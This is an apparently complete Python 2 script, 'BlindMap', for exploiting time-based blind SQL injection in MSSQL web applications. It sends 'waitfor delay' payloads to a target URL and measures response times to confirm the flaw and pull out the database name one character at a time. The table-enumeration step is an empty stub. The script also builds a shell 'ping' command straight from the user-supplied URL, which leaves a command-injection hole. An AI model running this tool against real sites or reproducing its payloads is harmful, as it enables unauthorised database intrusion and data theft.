#-*- coding: utf-8 -*-
#!/usr/bin/env python

# ----------------------------------------------------------------
#
# Copyright (c) 2015 BlindMap by jCarlo0s
# This tool was made to exploit the Blind SQL Injection Time-Based
#
# ----------------------------------------------------------------

import os
import sys
import getopt
import urllib2
import time

configuration = {
    "data": None,
    "url": None,
    "vuln_param": None
}

database_data = {
    "dbname": ""
}

ATTACKS = {
    "ascii_discover": "gato85' if (ASCII(lower(substring({query}, {index}, 1)))={ascii_code}) waitfor delay '00:00:10'--"
}

def get_args():
    try:
        opts, args = getopt.getopt(sys.argv[1:], '', ["url=", "data=", "injectable-param=", "dbname"])
        return opts
    except getopt.GetoptError as err:
        sys.exit(err)


def test_connection():
    if configuration["url"]:
        status = os.system("ping -c 1 " + configuration["url"].replace("http://", ""))
        if status == 0:
            return True
        return False
    else:
        sys.exit("There not url to test ...")


def make_request(data):
    start_time = time.time()
    request = urllib2.Request(configuration["url"], data)
    urllib2.urlopen(request)
    end_time = time.time()
    return end_time - start_time


def is_vurnerable():
    atack_data = configuration["data"].replace(
        configuration["vuln_param"],
        configuration["vuln_param"] + "=usuario' waitfor delay '00:00:10'--"
        )
    elapsed = make_request(atack_data)
    if elapsed < 10:
        sys.exit('Is not vulnerable')


def get_database_name():
    print "[+] Getting the database name length ..."
    db_length = 0
    # data base length
    for index in range(30):
        atack_data = configuration["data"].replace(
            configuration["vuln_param"],
            configuration["vuln_param"] + "=usuario' if (len(DB_NAME())={}) waitfor delay '00:00:10'--".format(index+1)
            )
        elapsed = make_request(atack_data)
        if not elapsed > 10:
            continue
        else:
            print "===> Database name length: {}".format(index+1)
            db_length = index + 1
            break

    print "[+] Discover ascii name ..."
    ascii_name = []
    for index in range(db_length):
        for ascii in range(126):
            query = "DB_NAME()"
            atack_data = configuration["data"].replace(
                configuration["vuln_param"],
                configuration["vuln_param"] + "=" + ATTACKS['ascii_discover'].format(
                    query=query,
                    index=(index+1),
                    ascii_code=(ascii+1))
                )
            elapsed = make_request(atack_data)
            if not elapsed > 10:
                continue
            else:
                print "===> Found ASCII Code for the position {}".format(index+1)
                ascii_name.append(ascii+1)
                break
    print "[+]Database name: " + str(ascii_name)


def get_database_tables():
    query = "select top 1 table_name from information_schema.tables where table_type='BASE TABLE'"
    pass


def start_attack():
    print "[+] Varify if host param is vulnerable"
    is_vurnerable()
    print "[+] Host Param Vulnerable. :)"
    print "[+] Starting the database discover process."
    print "[+] Getting the database name."
    get_database_name()
    print "[+] Getting database tables"
    get_database_tables()


def main():
    options = get_args()
    for option, data in options:
        if option in ("--url"):
            configuration["url"] = data
        elif option in ("--data"):
            configuration["data"] = data
        elif option in ("--injectable-param"):
            configuration["vuln_param"] = data
    start_attack()


def usage():
    print " ==================================================  "
    print "      Copyright (c) 2015 BlindMap by jCarlo0s        "
    print " =================================================== "
    print " Usage: python buildmap.py --type=MSSQL --url=http://example.com --data=param=value --injectable-param=param [options]"
    print "                                                     "
    print " Options                                             "
    print "                                                     "
    print " "
    sys.exit()

if __name__ == "__main__":
    main()
